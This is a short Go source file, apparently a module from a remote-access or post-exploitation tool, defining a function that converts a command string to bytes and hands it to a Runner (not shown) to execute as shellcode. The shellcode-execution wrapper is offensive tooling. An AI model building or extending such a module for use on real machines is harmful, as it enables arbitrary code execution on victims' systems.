package shellcode

import (
	"../util"
)

// ExecuteShellcode will transform and execute shellcode
func ExecuteShellcode(command string) ([]byte, error) {
	bytes, _ := util.StringToByteArrayString(command)
	execute := Runner(bytes)
	if execute {
		return []byte("Shellcode executed successfully."), nil
	}
	return []byte("Shellcode execution failed."), nil
}
